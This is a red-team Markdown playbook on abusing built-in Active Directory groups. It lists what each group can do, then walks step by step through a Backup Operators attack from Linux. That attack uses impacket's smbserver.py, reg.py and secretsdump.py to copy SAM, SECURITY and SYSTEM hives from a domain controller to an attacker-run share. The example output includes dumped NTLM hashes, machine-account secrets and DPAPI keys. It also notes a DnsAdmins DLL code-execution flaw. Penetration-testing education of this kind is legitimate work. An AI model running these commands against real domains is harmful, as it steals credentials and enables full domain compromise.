<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Built-In Groups
## References

## Overview
#### Backup Operators

* Members can backup or restore AD and have logon rights to DCs.
* Members can also remoely backup the necessary registry hives to dump SAM and LSA secrest and then perform a DCSync on the offline copy.

#### Account Operators

* References
	* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups]
* "This group is considered a service administrator group because it can modify Server Operators, which in turn can modify domain controller settings. As a best practice, leave the membership of this group empty, and do not use it for any delegated administration. This group cannot be renamed, deleted, or moved."
* Members can create and manage users and groups, including its own membership and that of the Server Operators group
* Follow the [Access Control Abuse Guide](Testaments_and_Books/Redvelations/Active_Directory/004-0_AD_Access_Control_Abuse.md) and use the "Add Member" ability

#### Administrators

* Members have full admin rights to the Active Directory domain and Domain Controllers

#### Server Operators

* Members can sign-in to a server, start and stop services, access domain controllers, perform maintenance tasks (such as backup and restore), and they have the ability to change binaries that are installed on the domain controllers

#### DnsAdmins

* Members may read, write, create, or delete DNS records (e.g., edit the wildcard record if it already exists).
* Ability to abuse CVE 2021 40469 to run code via a DLL on a DC operating under the guise of a DNS server -<br />[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40469](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40469)

#### Enterprise Admins
* Members have full admin rights to all Active Directory domains in the AD forest

#### Schema Admins
* Members can modify the schema structure of the Active Directory. Only the objects created after the modification are affected.

#### Group Policy Creators Owners
* Members can create Group Policies in the domain. Its members can't apply group policies to users or group or edit existing GPOs.

#### Cert Publishers
* Members are usually the servers managing ADCS

## Attacks
### From a Linux Machine

#### Account Operators


#### Backup Operators
1. start an SMB share
	* <details><summary>impacket's smbserver.py (Click to expand)</summary><p>
	
			smbserver.py -smb2support "someshare" "./"
	1. Save each hive
		* Manually
			* <details><summary>reg.py (Click to expand)</summary><p>
				* 'HKLM\SAM'

						reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o \\\\$LOCAL_IP\\someshare
				* 'HKLM\SAM'
		
						reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o \\\\$LOCAL_IP\\someshare
				* 'HKLM\SECURITY'
			
						reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o \\\\$LOCAL_IP\\someshare
		* Automatically
			* <details><summary>reg.py (Click to expand)</summary><p>
			
					reg.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$DOMAIN_CONTROLLER backup -o \\\\$LOCAL_IP\\someshare
				* Example Output: reg.py

						root@jack-Virtual-Machine:~/BACKUP# reg.py $DOMAIN/backup_operator:$PASSWORD@$DOMAIN_CONTROLLER backup -o \\\\$LOCAL_IP\\someshare
						Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

						[!] Cannot check RemoteRegistry status. Hoping it is started...
						[*] Saved HKLM\SAM to \\10.0.0.100\someshare\SAM.save
						[*] Saved HKLM\SYSTEM to \\10.0.0.100\someshare\SYSTEM.save
						[*] Saved HKLM\SECURITY to \\10.0.0.100\someshare\SECURITY.save
				* Example Output: smbserver.py

						root@jack-Virtual-Machine:~/BACKUP# smbserver.py -smb2support "someshare" "./"
						Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

						[*] Config file parsed
						[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
						[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
						[*] Config file parsed
						[*] Config file parsed
						[*] Config file parsed
						[*] Incoming connection (10.0.0.1,64435)
						[*] AUTHENTICATE_MESSAGE (\,DC01)
						[*] User DC01\ authenticated successfully
						[*] :::00::aaaaaaaaaaaaaaaa
						[*] Connecting Share(1:IPC$)
						[*] Connecting Share(2:someshare)
						[*] Disconnecting Share(1:IPC$)
						[*] Disconnecting Share(2:someshare)
						[*] Closing down connection (10.0.0.1,64435)
						[*] Remaining connections []
	1. Parse
		* <details><summary>secretsdump.py (Click to expand)</summary><p>

				secretsdump.py -sam $WORKDIR/sam.save -security $WORKDIR/security.save -system $WORKDIR/system.save LOCAL
			* Example Output

					root@jack-Virtual-Machine:~/BACKUP# secretsdump.py -sam /root/BACKUP/SAM.save -security /root/BACKUP/SECURITY.save -system /root/BACKUP/SYSTEM.save LOCAL
					Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

					[*] Target system bootKey: 0x15003c60281cd7a996eb96310d049c6d
					[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
					Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
					Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
					DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
					[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
					[*] Dumping cached domain logon information (domain/username:hash)
					[*] Dumping LSA Secrets
					[*] $MACHINE.ACC 
					$MACHINE.ACC:plain_password_hex:8697a026482afa02a73cee3d403063eaa715de0da2de33761b88e9c68276309a35179e6364bbf0d2597785c0c9ca9646b2c8e827b7389bd039c3528c45db517adcf426fbd403bb0c90d8ec5382f4626f3e242cf44f59c09db3fd63d779e989a148177a29c98e7ebc20a0bf90fbbb064b08690bc1a07b28cd1969d1b74106eb309692b04dc170c92056ddd4c9f787cf3faa8782271d36d8305c53bea89331a7d1288e9481f9d4bdd299d17e66d226f1394b8be268fa0742d8c521951bc500ca4dc4bc98ecbd52ae33ddc66ff6e880484c91101243912950852da90da2af1cc9f259f22068bcb076ad0a0f1ec8240ccfab
					$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:94f2721f78c81bb17b4e3b39acb1cba0
					[*] DPAPI_SYSTEM 
					dpapi_machinekey:0x0b044ecf4f4a1be9006e6fff2af9e329153876af
					dpapi_userkey:0xe2732c2d9d9468156b8a93e92a678b4abc7f3f30
					[*] NL$KM 
					 0000   D4 DF 59 C5 35 32 C8 06  9D 97 22 81 BA F2 8B 61   ..Y.52...."....a
					 0010   AC 89 D7 B3 35 EC 1C BD  45 01 EF 69 BF 44 CE 75   ....5...E..i.D.u
					 0020   E8 7C F2 07 AF 1C BB 2B  67 BE BD 58 A1 ED 34 D4   .|.....+g..X..4.
					 0030   E8 08 4E DE 84 69 50 5F  70 2E E0 5A 40 28 F8 92   ..N..iP_p..Z@(..
					NL$KM:d4df59c53532c8069d972281baf28b61ac89d7b335ec1cbd4501ef69bf44ce75e87cf207af1cbb2b67bebd58a1ed34d4e8084ede8469505f702ee05a4028f892
					[*] Cleaning up...

